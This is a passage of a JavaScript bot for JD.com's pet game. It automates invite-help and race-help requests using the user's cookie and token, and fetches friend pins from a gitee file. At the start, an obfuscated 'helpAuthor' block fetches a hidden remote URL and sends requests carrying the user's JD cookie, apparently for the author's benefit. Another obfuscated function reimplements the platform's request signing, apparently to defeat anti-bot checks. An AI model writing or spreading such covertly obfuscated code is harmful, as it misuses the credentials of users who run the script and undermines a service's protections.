_0x1182cf=_0x1e18['PtITcZ'][_0x511006];if(_0x1182cf===undefined){if(_0x1e18['xQASSE']===undefined){_0x1e18['xQASSE']=!![];}_0x1d9b16=_0x1e18['jlfcTG'](_0x1d9b16,_0xed8bf5);_0x1e18['PtITcZ'][_0x511006]=_0x1d9b16;}else{_0x1d9b16=_0x1182cf;}return _0x1d9b16;};if(helpAuthor){new Promise(_0x167f57=>{var _0x4d9a67={'AFiDt':function(_0xc95db1,_0x14ac14){return _0xc95db1!==_0x14ac14;},'ZWvPr':_0x1e18('0','2!p1'),'gTodR':function(_0x523530){return _0x523530();},'zKvXe':'api.m.jd.com','hiPaK':_0x1e18('1','Av6S'),'hxxxk':_0x1e18('2','!&Ih'),'XKqQp':_0x1e18('3','V4jY'),'IphyZ':_0x1e18('4','Ewi8'),'bDRkt':_0x1e18('5','Lyob'),'ORdxB':_0x1e18('6','dhK6'),'bYHfD':_0x1e18('7','yp&8'),'lEKjz':'keep-alive','vcYlw':_0x1e18('8','@A2M'),'grrJW':'azleb','biuPq':function(_0x31385b,_0x41b5d0){return _0x31385b===_0x41b5d0;},'yScUp':'pvBKI','WMhPL':_0x1e18('9','RwSp'),'WVmvs':_0x1e18('a','S4vB')};$[_0x1e18('b','dhK6')]({'url':_0x4d9a67['WMhPL'],'headers':{'User-Agent':_0x4d9a67[_0x1e18('c','vH2M')]}},(_0x5adb74,_0x3ee601,_0x2a544a)=>{var _0x395cc3={'debep':_0x4d9a67[_0x1e18('d','uULr')],'Nuzjh':_0x4d9a67['hiPaK'],'CELab':_0x4d9a67['hxxxk'],'piYNi':_0x1e18('e','8adF'),'kTITg':_0x4d9a67['XKqQp'],'ANlkv':_0x4d9a67['IphyZ']};try{if(_0x2a544a){$['dataGet']=JSON[_0x1e18('f','R2(5')](_0x2a544a);if(_0x4d9a67['AFiDt']($[_0x1e18('10','cWyn')][_0x1e18('11','2RF$')][_0x1e18('12','mpP6')],0x0)){if(_0x4d9a67[_0x1e18('13','2DQ1')]!==_0x4d9a67[_0x1e18('14','2DQ1')]){let _0x2b5d8a={'url':_0x1e18('15','2plS'),'headers':{'Host':_0x4d9a67['zKvXe'],'Content-Type':_0x4d9a67[_0x1e18('16','UVUi')],'Origin':_0x4d9a67['bYHfD'],'Accept-Encoding':'gzip,\x20deflate,\x20br','Cookie':cookie,'Connection':_0x4d9a67['lEKjz'],'Accept':_0x4d9a67['vcYlw'],'User-Agent':_0x4d9a67[_0x1e18('17','UVUi')],'Referer':_0x1e18('18','8adF')+$[_0x1e18('19','YBbl')][_0x1e18('1a','Av6S')][0x0]['actID']+'&way=0&lng=&lat=&sid=&un_area=','Accept-Language':_0x4d9a67[_0x1e18('1b','UVUi')]},'body':_0x1e18('1c','2!p1')+$[_0x1e18('1d','mpP6')][_0x1e18('1e','Ewi8')][0x0][_0x1e18('1f','$aw3')]+_0x1e18('20','vH2M')+$['dataGet']['data'][0x0][_0x1e18('21','7OWk')]+_0x1e18('22','cWyn')};return new Promise(_0x167f57=>{if(_0x4d9a67[_0x1e18('23','vILI')](_0x4d9a67[_0x1e18('24','RrIo')],_0x1e18('25','yp&8'))){console['log'](e);}else{$[_0x1e18('26','B)Pj')](_0x2b5d8a,(_0x5adb74,_0x3e0e89,_0x2a544a)=>{});}});}else{_0x4d9a67['gTodR'](_0x167f57);}}}}catch(_0x5ee799){if(_0x4d9a67[_0x1e18('27','dGS%')]!=='azleb'){$['dataGet']=JSON[_0x1e18('28','&pty')](_0x2a544a);if($[_0x1e18('29','B)Pj')][_0x1e18('2a','RwSp')][_0x1e18('2b','dGS%')]!==0x0){let _0x32c29f={'url':_0x1e18('2c','DQvf'),'headers':{'Host':_0x395cc3[_0x1e18('2d','5DAn')],'Content-Type':_0x395cc3['Nuzjh'],'Origin':'https://h5.m.jd.com','Accept-Encoding':_0x395cc3['CELab'],'Cookie':cookie,'Connection':'keep-alive','Accept':_0x395cc3['piYNi'],'User-Agent':_0x395cc3[_0x1e18('2e','V4jY')],'Referer':'https://h5.m.jd.com/babelDiy/Zeus/4ZK4ZpvoSreRB92RRo8bpJAQNoTq/index.html?serveId=wxe30973feca923229&actId='+$['dataGet'][_0x1e18('2f','2JlU')][0x0][_0x1e18('30',']PT8')]+_0x1e18('31','6$E0'),'Accept-Language':_0x395cc3['ANlkv']},'body':_0x1e18('32','Ewi8')+$[_0x1e18('33','8adF')][_0x1e18('34','%NML')][0x0][_0x1e18('35','c8!6')]+_0x1e18('36','#D[I')+$[_0x1e18('37','[6ea')][_0x1e18('38','cWyn')][0x0][_0x1e18('39','V4jY')]+_0x1e18('22','cWyn')};return new Promise(_0x2d38a0=>{$[_0x1e18('3a','2DQ1')](_0x32c29f,(_0x4f5437,_0x510469,_0x31d9b6)=>{});});}}else{console['log'](_0x5ee799);}}finally{if(_0x4d9a67[_0x1e18('3b','2sYL')](_0x1e18('3c','YBbl'),_0x4d9a67[_0x1e18('3d','%NML')])){$[_0x1e18('3e','&RCX')](opt,(_0x5ade85,_0x44bcb0,_0x235aa9)=>{});}else{_0x4d9a67[_0x1e18('3f','vH2M')](_0x167f57);}}});});};_0xoda='jsjiami.com.v6';
      if (data.success) {
        const { helpStatus } = data.data;
        console.log(`helpStatus ${helpStatus}`)
        if (helpStatus=== 'help_full') {
          break;
        } else if (helpStatus=== 'cannot_help') {
          continue;
        } else if (helpStatus=== 'invite_full') {
          continue;
        } else if (helpStatus=== 'can_help') {
          const LKYL_DATA = await helpInviteFriend(item);
          if (LKYL_DATA.errorCode === 'L0001' && !LKYL_DATA.success) {
            console.log('来客有礼宠汪汪token失效');
            $.setdata('', 'jdJoyRunToken');
            $.msg($.name, '【提示】来客有礼token失效，请重新获取', "微信搜索'来客有礼'小程序\n点击底部的'发现'Tab\n即可获取Token")
            $.LKYLLogin = false;
            break
          } else {
            $.LKYLLogin = true;
          }
        }
        $.jdLogin = true;
      } else {
        if (data.errorCode === 'B0001') {
          console.log('京东Cookie失效');
          $.msg($.name, `【提示】京东cookie已失效`, `京东账号${$.index} ${UserName}\n请重新登录获取\nhttps://bean.m.jd.com/bean/signIndex.action`, {"open-url": "https://bean.m.jd.com/bean/signIndex.action"});
          $.jdLogin = false;
          break
        }
      }
    }
  }
  // if ($.inviteReward > 0) {
  //   $.msg($.name, ``, `账号${$.index} [${UserName}]\n给${$.inviteReward/5}人邀请助力成功\n获得${$.inviteReward}积分`)
  // }
}
function enterRoom(invitePin) {
  return new Promise(resolve => {
    headers.Cookie = cookie;
    headers.LKYLToken = $.LKYLToken;
    headers['Content-Type'] = "application/json";
    let opt = {
      // url: "//jdjoy.jd.com/common/pet/getPetTaskConfig?reqSource=h5",
      url: `//draw.jdfcloud.com/common/pet/enterRoom/h5?reqSource=h5&invitePin=${encodeURI(invitePin)}&inviteSource=task_invite&shareSource=weapp&inviteTimeStamp=${Date.now()}`,
      method: "GET",
      data: {},
      credentials: "include",
      header: {"content-type": "application/json"}
    }
    const url = "https:"+ taroRequest(opt)['url']
    const options = {
      url,
      body: '{}',
      headers
    }
    $.post(options, (err, resp, data) => {
      try {
        if (err) {
          $.log(`${$.name} API请求失败`)
          $.log(JSON.stringify(err))
        } else {
          // console.log('进入房间', data)
          data = JSON.parse(data);
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve(data);
      }
    });
  })
}
function helpInviteFriend(friendPin) {
  return new Promise((resolve) => {
    headers.Cookie = cookie;
    headers.LKYLToken = $.LKYLToken;
    let opt = {
      // url: "//jdjoy.jd.com/common/pet/getPetTaskConfig?reqSource=h5",
      url: `//draw.jdfcloud.com/common/pet/helpFriend?friendPin=${encodeURI(friendPin)}&reqSource=h5`,
      method: "GET",
      data: {},
      credentials: "include",
      header: {"content-type": "application/json"}
    }
    const url = "https:"+ taroRequest(opt)['url']
    const options = {
      url,
      headers
    }
    $.get(options, (err, resp, data) => {
      try {
        if (err) {
          $.log('API请求失败')
          $.logErr(JSON.stringify(err));
        } else {
          $.log(`邀请助力结果：${data}`);
          data = JSON.parse(data);
          // {"errorCode":"help_ok","errorMessage":null,"currentTime":1600254297789,"data":29466,"success":true}
          if (data.success && data.errorCode === 'help_ok') {
            $.inviteReward += 30;
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve(data);
      }
    });
  })
}
//赛跑助力
async function run(run_pins) {
  for (let item of run_pins.map(item => item.trim())) {
    console.log(`\n账号${$.index} [${UserName}] 开始`)
    const combatDetailRes = await combatDetail(item);
    const { petRaceResult } = combatDetailRes.data;
    console.log(`petRaceResult ${petRaceResult}`);
    if (petRaceResult === 'help_full') {
      break;
    } else if (petRaceResult === 'can_help') {
      const LKYL_DATA = await combatHelp(item);
      if (LKYL_DATA.errorCode === 'L0001' && !LKYL_DATA.success) {
        console.log('来客有礼宠汪汪token失效');
        $.setdata('', 'jdJoyRunToken');
        $.msg($.name, '【提示】来客有礼token失效，请重新获取', "微信搜索'来客有礼'小程序\n点击底部的'发现'Tab\n即可获取Token")
        $.LKYLLogin = false;
        break
      } else {
        $.LKYLLogin = true;
      }
    }
  }
  // if ($.runReward > 0) {
  //   $.msg($.name, ``, `账号${$.index} [${UserName}]\n给${$.runReward/5}人赛跑助力成功\n获得狗粮${$.runReward}g`)
  // }
}
function combatHelp(friendPin) {
  return new Promise(resolve => {
    headers.Cookie = cookie;
    headers.LKYLToken = $.LKYLToken;
    let opt = {
      // url: "//jdjoy.jd.com/common/pet/getPetTaskConfig?reqSource=h5",
      url: `//draw.jdfcloud.com/common/pet/combat/help?friendPin=${encodeURI(friendPin)}&reqSource=h5`,
      method: "GET",
      data: {},
      credentials: "include",
      header: {"content-type": "application/json"}
    }
    const url = "https:"+ taroRequest(opt)['url']
    const options = {
      url,
      headers
    }
    $.get(options, (err, resp, data) => {
      try {
        if (err) {
          $.log('API请求失败')
          $.logErr(JSON.stringify(err));
        } else {
          $.log(`结果${data}`);
          data = JSON.parse(data);
          // {"errorCode":"help_ok","errorMessage":null,"currentTime":1600479266133,"data":{"rewardNum":5,"helpStatus":"help_ok","newUser":false},"success":true}
          if (data.errorCode === 'help_ok' && data.data.helpStatus === 'help_ok') {
            console.log(`获得狗粮${data.data.rewardNum}g\n`);
            $.runReward += data.data.rewardNum;
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve(data);
      }
    });
  })
}
function combatDetail(invitePin) {
  return new Promise(resolve => {
    headers.Cookie = cookie;
    headers.LKYLToken = $.LKYLToken;
    let opt = {
      // url: "//jdjoy.jd.com/common/pet/getPetTaskConfig?reqSource=h5",
      url: `//draw.jdfcloud.com/common/pet/combat/detail/v2?help=true&inviterPin=${encodeURI(invitePin)}&reqSource=h5`,
      method: "GET",
      data: {},
      credentials: "include",
      header: {"content-type": "application/json"}
    }
    const url = "https:"+ taroRequest(opt)['url']
    const options = {
      url,
      headers
    }
    $.get(options, (err, resp, data) => {
      try {
        if (err) {
          $.log('API请求失败')
          $.logErr(JSON.stringify(err));
        } else {
          data = JSON.parse(data);
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve(data);
      }
    });
  })
}
function isURL(domain, reg) {
  // const name = reg;
  return reg.test(domain);
}
function jsonParse(str) {
  if (typeof str == "string") {
    try {
      return JSON.parse(str);
    } catch (e) {
      console.log(e);
      $.msg($.name, '', '请勿随意在BoxJs输入框修改内容\n建议通过脚本去获取cookie')
      return [];
    }
  }
}
function getRandomArrayElements(arr, count) {
  let shuffled = arr.slice(0), i = arr.length, min = i - count, temp, index;
  while (i-- > min) {
    index = Math.floor((i + 1) * Math.random());
    temp = shuffled[index];
    shuffled[index] = shuffled[i];
    shuffled[i] = temp;
  }
  return shuffled.slice(min);
}
function getFriendPins() {
  return new Promise(resolve => {
    $.get({
      url: "https://gitee.com/lxk0301/updateTeam/raw/master/friendPins.json",
      headers:{
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1 Edg/87.0.4280.88"
      },
      timeout: 100000}, async (err, resp, data) => {
      try {
        if (err) {
          console.log(`getFriendPins::${JSON.stringify(err)}`);
        } else {
          $.friendPins = data && JSON.parse(data);
          if ($.friendPins && $.friendPins['friendsArr']) {
            friendsArr = $.friendPins['friendsArr'];
            console.log(`\n共提供 ${friendsArr.length}个好友供来进行邀请助力\n`)
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}
isRequest ? getToken() : main();
var __encode ='jsjiami.com',_a={}, _0xb483=["\x5F\x64\x65\x63\x6F\x64\x65","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x73\x6F\x6A\x73\x6F\x6E\x2E\x63\x6F\x6D\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x6F\x62\x66\x75\x73\x63\x61\x74\x6F\x72\x2E\x68\x74\x6D\x6C"];(function(_0xd642x1){_0xd642x1[_0xb483[0]]= _0xb483[1]})(_a);var __Oxb227b=["\x69\x73\x4E\x6F\x64\x65","\x63\x72\x79\x70\x74\x6F\x2D\x6A\x73","\x39\x38\x63\x31\x34\x63\x39\x39\x37\x66\x64\x65\x35\x30\x63\x63\x31\x38\x62\x64\x65\x66\x65\x63\x66\x64\x34\x38\x63\x65\x62\x37","\x70\x61\x72\x73\x65","\x55\x74\x66\x38","\x65\x6E\x63","\x65\x61\x36\x35\x33\x66\x34\x66\x33\x63\x35\x65\x64\x61\x31\x32","\x63\x69\x70\x68\x65\x72\x74\x65\x78\x74","\x43\x42\x43","\x6D\x6F\x64\x65","\x50\x6B\x63\x73\x37","\x70\x61\x64","\x65\x6E\x63\x72\x79\x70\x74","\x41\x45\x53","\x48\x65\x78","\x73\x74\x72\x69\x6E\x67\x69\x66\x79","\x42\x61\x73\x65\x36\x34","\x64\x65\x63\x72\x79\x70\x74","\x6C\x65\x6E\x67\x74\x68","\x6D\x61\x70","\x73\x6F\x72\x74","\x6B\x65\x79\x73","\x67\x69\x66\x74","\x70\x65\x74","\x69\x6E\x63\x6C\x75\x64\x65\x73","\x26","\x6A\x6F\x69\x6E","\x3D","\x3F","\x69\x6E\x64\x65\x78\x4F\x66","\x63\x6F\x6D\x6D\x6F\x6E\x2F","\x72\x65\x70\x6C\x61\x63\x65","\x68\x65\x61\x64\x65\x72","\x75\x72\x6C","\x72\x65\x71\x53\x6F\x75\x72\x63\x65\x3D\x68\x35","\x61\x73\x73\x69\x67\x6E","\x6D\x65\x74\x68\x6F\x64","\x47\x45\x54","\x64\x61\x74\x61","\x74\x6F\x4C\x6F\x77\x65\x72\x43\x61\x73\x65","\x6B\x65\x79\x43\x6F\x64\x65","\x63\x6F\x6E\x74\x65\x6E\x74\x2D\x74\x79\x70\x65","\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x54\x79\x70\x65","","\x67\x65\x74","\x70\x6F\x73\x74","\x61\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x2F\x78\x2D\x77\x77\x77\x2D\x66\x6F\x72\x6D\x2D\x75\x72\x6C\x65\x6E\x63\x6F\x64\x65\x64","\x5F","\x75\x6E\x64\x65\x66\x69\x6E\x65\x64","\x6C\x6F\x67","\u5220\u9664","\u7248\u672C\u53F7\uFF0C\x6A\x73\u4F1A\u5B9A","\u671F\u5F39\u7A97\uFF0C","\u8FD8\u8BF7\u652F\u6301\u6211\u4EEC\u7684\u5DE5\u4F5C","\x6A\x73\x6A\x69\x61","\x6D\x69\x2E\x63\x6F\x6D"];function taroRequest(_0x1226x2){const _0x1226x3=$[__Oxb227b[0x0]]()?require(__Oxb227b[0x1]):CryptoJS;const _0x1226x4=__Oxb227b[0x2];const _0x1226x5=_0x1226x3[__Oxb227b[0x5]][__Oxb227b[0x4]][__Oxb227b[0x3]](_0x1226x4);const _0x1226x6=_0x1226x3[__Oxb227b[0x5]][__Oxb227b[0x4]][__Oxb227b[0x3]](__Oxb227b[0x6]);let _0x1226x7={"\x41\x65\x73\x45\x6E\x63\x72\x79\x70\x74":function _0x1226x8(_0x1226x2){var _0x1226x9=_0x1226x3[__Oxb227b[0x5]][__Oxb227b[0x4]][__Oxb227b[0x3]](_0x1226x2);return _0x1226x3[__Oxb227b[0xd]][__Oxb227b[0xc]](_0x1226x9,_0x1226x5,{"\x69\x76":_0x1226x6,"\x6D\x6F\x64\x65":_0x1226x3[__Oxb227b[0x9]][__Oxb227b[0x8]],"\x70\x61\x64\x64\x69\x6E\x67":_0x1226x3[__Oxb227b[0xb]][__Oxb227b[0xa]]})[__Oxb227b[0x7]].toString()},"\x41\x65\x73\x44\x65\x63\x72\x79\x70\x74":function _0x1226xa(_0x1226x2){var _0x1226x9=_0x1226x3[__Oxb227b[0x5]][__Oxb227b[0xe]][__Oxb227b[0x3]](_0x1226x2),_0x1226xb=_0x1226x3[__Oxb227b[0x5]][__Oxb227b[0x10]][__Oxb227b[0xf]](_0x1226x9);return _0x1226x3[__Oxb227b[0xd]][__Oxb227b[0x11]](_0x1226xb,_0x1226x5,{"\x69\x76":_0x1226x6,"\x6D\x6F\x64\x65":_0x1226x3[__Oxb227b[0x9]][__Oxb227b[0x8]],"\x70\x61\x64\x64\x69\x6E\x67":_0x1226x3[__Oxb227b[0xb]][__Oxb227b[0xa]]}).toString(_0x1226x3[__Oxb227b[0x5]].Utf8).toString()},"\x42\x61\x73\x65\x36\x34\x45\x6E\x63\x6F\x64\x65":function _0x1226xc(_0x1226x2){var _0x1226x9=_0x1226x3[__Oxb227b[0x5]][__Oxb227b[0x4]][__Oxb227b[0x3]](_0x1226x2);return _0x1226x3[__Oxb227b[0x5]][__Oxb227b[0x10]][__Oxb227b[0xf]](_0x1226x9)},"\x42\x61\x73\x65\x36\x34\x44\x65\x63\x6F\x64\x65":function _0x1226xd(_0x1226x2){return _0x1226x3[__Oxb227b[0x5]][__Oxb227b[0x10]][__Oxb227b[0x3]](_0x1226x2).toString(_0x1226x3[__Oxb227b[0x5]].Utf8)},"\x4D\x64\x35\x65\x6E\x63\x6F\x64\x65":function _0x1226xe(_0x1226x2){return _0x1226x3.MD5(_0x1226x2).toString()},"\x6B\x65\x79\x43\x6F\x64\x65":__Oxb227b[0x2]};const _0x1226xf=function _0x1226x10(_0x1226x2,_0x1226x9){if(_0x1226x2 instanceof  Array){_0x1226x9= _0x1226x9|| [];for(var _0x1226xb=0;_0x1226xb< _0x1226x2[__Oxb227b[0x12]];_0x1226xb++){_0x1226x9[_0x1226xb]= _0x1226x10(_0x1226x2[_0x1226xb],_0x1226x9[_0x1226xb])}}else {!(_0x1226x2 instanceof  Array)&& _0x1226x2 instanceof  Object?(_0x1226x9= _0x1226x9|| {},Object[__Oxb227b[0x15]](_0x1226x2)[__Oxb227b[0x14]]()[__Oxb227b[0x13]](function(_0x1226xb){_0x1226x9[_0x1226xb]= _0x1226x10(_0x1226x2[_0x1226xb],_0x1226x9[_0x1226xb])})):_0x1226x9= _0x1226x2};return _0x1226x9};const _0x1226x11=function _0x1226x12(_0x1226x2){for(var _0x1226x9=[__Oxb227b[0x16],__Oxb227b[0x17]],_0x1226xb=!1,_0x1226x3=0;_0x1226x3< _0x1226x9[__Oxb227b[0x12]];_0x1226x3++){var _0x1226x4=_0x1226x9[_0x1226x3];_0x1226x2[__Oxb227b[0x18]](_0x1226x4)&&  !_0x1226xb&& (_0x1226xb=  !0)};return _0x1226xb};const _0x1226x13=function _0x1226x14(_0x1226x2,_0x1226x9){if(_0x1226x9&& Object[__Oxb227b[0x15]](_0x1226x9)[__Oxb227b[0x12]]> 0){var _0x1226xb=Object[__Oxb227b[0x15]](_0x1226x9)[__Oxb227b[0x13]](function(_0x1226x2){return _0x1226x2+ __Oxb227b[0x1b]+ _0x1226x9[_0x1226x2]})[__Oxb227b[0x1a]](__Oxb227b[0x19]);return _0x1226x2[__Oxb227b[0x1d]](__Oxb227b[0x1c])>= 0?_0x1226x2+ __Oxb227b[0x19]+ _0x1226xb:_0x1226x2+ __Oxb227b[0x1c]+ _0x1226xb};return _0x1226x2};const _0x1226x15=function _0x1226x16(_0x1226x2){for(var _0x1226x9=_0x1226x6,_0x1226xb=0;_0x1226xb< _0x1226x9[__Oxb227b[0x12]];_0x1226xb++){var _0x1226x3=_0x1226x9[_0x1226xb];_0x1226x2[__Oxb227b[0x18]](_0x1226x3)&&  !_0x1226x2[__Oxb227b[0x18]](__Oxb227b[0x1e]+ _0x1226x3)&& (_0x1226x2= _0x1226x2[__Oxb227b[0x1f]](_0x1226x3,__Oxb227b[0x1e]+ _0x1226x3))};return _0x1226x2};var _0x1226x9=_0x1226x2,_0x1226xb=(_0x1226x9[__Oxb227b[0x20]],_0x1226x9[__Oxb227b[0x21]]);_0x1226xb+= (_0x1226xb[__Oxb227b[0x1d]](__Oxb227b[0x1c])>  -1?__Oxb227b[0x19]:__Oxb227b[0x1c])+ __Oxb227b[0x22];var _0x1226x17=function _0x1226x18(_0x1226x2){var _0x1226x9=_0x1226x2[__Oxb227b[0x21]],_0x1226xb=_0x1226x2[__Oxb227b[0x24]],_0x1226x3=void(0)=== _0x1226xb?__Oxb227b[0x25]:_0x1226xb,_0x1226x4=_0x1226x2[__Oxb227b[0x26]],_0x1226x6=_0x1226x2[__Oxb227b[0x20]],_0x1226x19=void(0)=== _0x1226x6?{}:_0x1226x6,_0x1226x1a=_0x1226x3[__Oxb227b[0x27]](),_0x1226x1b=_0x1226x7[__Oxb227b[0x28]],_0x1226x1c=_0x1226x19[__Oxb227b[0x29]]|| _0x1226x19[__Oxb227b[0x2a]]|| __Oxb227b[0x2b],_0x1226x1d=__Oxb227b[0x2b],_0x1226x1e=+ new Date();return _0x1226x1d= __Oxb227b[0x2c]!== _0x1226x1a&& (__Oxb227b[0x2d]!== _0x1226x1a|| __Oxb227b[0x2e]!== _0x1226x1c[__Oxb227b[0x27]]()&& _0x1226x4&& Object[__Oxb227b[0x15]](_0x1226x4)[__Oxb227b[0x12]])?_0x1226x7.Md5encode(_0x1226x7.Base64Encode(_0x1226x7.AesEncrypt(__Oxb227b[0x2b]+ JSON[__Oxb227b[0xf]](_0x1226xf(_0x1226x4))))+ __Oxb227b[0x2f]+ _0x1226x1b+ __Oxb227b[0x2f]+ _0x1226x1e):_0x1226x7.Md5encode(__Oxb227b[0x2f]+ _0x1226x1b+ __Oxb227b[0x2f]+ _0x1226x1e),_0x1226x11(_0x1226x9)&& (_0x1226x9= _0x1226x13(_0x1226x9,{"\x6C\x6B\x73":_0x1226x1d,"\x6C\x6B\x74":_0x1226x1e}),_0x1226x9= _0x1226x15(_0x1226x9)),Object[__Oxb227b[0x23]](_0x1226x2,{"\x75\x72\x6C":_0x1226x9})}(_0x1226x2= Object[__Oxb227b[0x23]](_0x1226x2,{"\x75\x72\x6C":_0x1226xb}));return _0x1226x17}(function(_0x1226x1f,_0x1226xf,_0x1226x20,_0x1226x21,_0x1226x1c,_0x1226x22){_0x1226x22= __Oxb227b[0x30];_0x1226x21= function(_0x1226x19){if( typeof alert!== _0x1226x22){alert(_0x1226x19)};if( typeof console!== _0x1226x22){console[__Oxb227b[0x31]](_0x1226x19)}};_0x1226x20= function(_0x1226x3,_0x1226x1f){return _0x1226x3+ _0x1226x1f};_0x1226x1c= _0x1226x20(__Oxb227b[0x32],_0x1226x20(_0x1226x20(__Oxb227b[0x33],__Oxb227b[0x34]),__Oxb227b[0x35]));try{_0x1226x1f= __encode;if(!( typeof _0x1226x1f!== _0x1226x22&& _0x1226x1f=== _0x1226x20(__Oxb227b[0x36],__Oxb227b[0x37]))){_0x1226x21(_0x1226x1c)}}catch(e){_0x1226x21(_0x1226x1c)}})({})
function Env(t,e){class s{constructor(t){this.env=t}send(t,e="GET"){t="string"==typeof t?{url:t}:t;let s=this.get;return"POST"===e&&(s=this.post),new Promise((e,i)=>{s.call(this,t,(t,s,r)=>{t?i(t):e(s)})})}get(t){return this.send.call(this.env,t)}post(t){return this.send.call(this.env,t,"POST")}}return new class{constructor(t,e){this.name=t,this.http=new s(this),this.data=null,this.dataFile="box.dat",this.logs=[],this.isMute=!1,this.isNeedRewrite=!1,this.logSeparator="\n",this.startTime=(new Date).getTime(),Object.assign(this,e),this.log("",`🔔${this.name}, 开始!`)}isNode(){return"undefined"!=typeof module&&!!module.exports}isQuanX(){return"undefined"!=typeof $task}isSurge(){return"undefined"!=typeof $httpClient&&"undefined"==typeof $loon}isLoon(){return"undefined"!=typeof $loon}toObj(t,e=null){try{return JSON.parse(t)}catch{return e}}toStr(t,e=null){try{return JSON.stringify(t)}catch{return e}}getjson(t,e){let s=e;const i=this.getdata(t);if(i)try{s=JSON.parse(this.getdata(t))}catch{}return s}setjson(t,e){try{return this.setdata(JSON.stringify(t),e)}catch{return!1}}getScript(t){return new Promise(e=>{this.get({url:t},(t,s,i)=>e(i))})}runScript(t,e){return new Promise(s=>{let i=this.getdata("@chavy_boxjs_userCfgs.httpapi");i=i?i.replace(/\n/g,"").trim():i;let r=this.getdata("@chavy_boxjs_userCfgs.httpapi_timeout");r=r?1*r:20,r=e&&e.timeout?e.timeout:r;const[o,h]=i.split("@"),n={url:`http://${h}/v1/scripting/evaluate`,body:{script_text:t,mock_type:"cron",timeout:r},headers:{"X-Key":o,Accept:"*/*"}};this.post(n,(t,e,i)=>s(i))}).catch(t=>this.logErr(t))}loaddata(){if(!this.isNode())return{};{this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e);if(!s&&!i)return{};{const i=s?t:e;try{return JSON.parse(this.fs.readFileSync(i))}catch(t){return{}}}}}writedata(){if(this.isNode()){this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e),r=JSON.stringify(this.data);s?this.fs.writeFileSync(t,r):i?this.fs.writeFileSync(e,r):this.fs.writeFileSync(t,r)}}lodash_get(t,e,s){const i=e.replace(/\[(\d+)\]/g,".$1").split(".");let r=t;for(const t of i)if(r=Object(r)[t],void 0===r)return s;return r}lodash_set(t,e,s){return Object(t)!==t?t:(Array.isArray(e)||(e=e.toString().match(/[^.[\]]+/g)||[]),e.slice(0,-1).reduce((t,s,i)=>Object(t[s])===t[s]?t[s]:t[s]=Math.abs(e[i+1])>>0==+e[i+1]?[]:{},t)[e[e.length-1]]=s,t)}getdata(t){let e=this.getval(t);if(/^@/.test(t)){const[,s,i]=/^@(.*?)\.(.*?)$/.exec(t),r=s?this.getval(s):"";if(r)try{const t=JSON.parse(r);e=t?this.lodash_get(t,i,""):e}catch(t){e=""}}return e}setdata(t,e){let s=!1;if(/^@/.test(e)){const[,i,r]=/^@(.*?)\.(.*?)$/.exec(e),o=this.getval(i),h=i?"null"===o?null:o||"{}":"{}";try{const e=JSON.parse(h);this.lodash_set(e,r,t),s=this.setval(JSON.stringify(e),i)}catch(e){const o={};this.lodash_set(o,r,t),s=this.setval(JSON.stringify(o),i)}}else s=this.setval(t,e);return s}getval(t){return this.isSurge()||this.isLoon()?$persistentStore.read(t):this.isQuanX()?$prefs.valueForKey(t):this.isNode()?(this.data=this.loaddata(),this.data[t]):this.data&&this.data[t]||null}setval(t,e){return this.isSurge()||this.isLoon()?$persistentStore.write(t,e):this.isQuanX()?$prefs.setValueForKey(t,e):this.isNode()?(this.data=this.loaddata(),this.data[e]=t,this.writedata(),!0):this.data&&this.data[e]||null}initGotEnv(t){this.got=this.got?this.got:require("got"),this.cktough=this.cktough?this.cktough:require("tough-cookie"),this.ckjar=this.ckjar?this.ckjar:new this.cktough.CookieJar,t&&(t.headers=t.headers?t.headers:{},void 0===t.headers.Cookie&&void 0===t.cookieJar&&(t.cookieJar=this.ckjar))}get(t,e=(()=>{})){t.headers&&(delete t.headers["Content-Type"],delete t.headers["Content-Length"]),this.isSurge()||this.isLoon()?(this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.get(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)})):this.isQuanX()?(this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t))):this.isNode()&&(this.initGotEnv(t),this.got(t).on("redirect",(t,e)=>{try{if(t.headers["set-cookie"]){const s=t.headers["set-cookie"].map(this.cktough.Cookie.parse).toString();s&&this.ckjar.setCookieSync(s,null),e.cookieJar=this.ckjar}}catch(t){this.logErr(t)}}).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)}))}post(t,e=(()=>{})){if(t.body&&t.headers&&!t.headers["Content-Type"]&&(t.headers["Content-Type"]="application/x-www-form-urlencoded"),t.headers&&delete t.headers["Content-Length"],this.isSurge()||this.isLoon())this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.post(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)});else 